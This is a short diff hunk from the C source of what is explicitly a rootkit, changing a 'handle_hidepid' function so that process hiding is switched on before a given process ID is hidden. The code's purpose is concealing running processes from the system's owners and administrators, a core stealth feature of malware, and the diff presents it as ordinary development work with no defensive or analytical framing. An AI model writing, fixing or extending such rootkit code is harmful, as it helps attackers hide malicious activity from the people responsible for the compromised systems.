@@ -144,10 +144,12 @@ handle_hidepid(unsigned long arg)
         unhide_pid((pid_t)(-sarg));
         DEBUG_NOTICE("unhiding pid %ld\n", -sarg);
     } else if (sarg > 0) {
-        hide_pid((pid_t)sarg);
-        if (!rootkit.hiding_pids)
+        if (!rootkit.hiding_pids) {
+            hide_pids();
             DEBUG_NOTICE("hidepid on\n");
+        }
 
+        hide_pid((pid_t)sarg);
         rootkit.hiding_pids = 1;
         DEBUG_NOTICE("hiding pid %ld\n", sarg);
     }
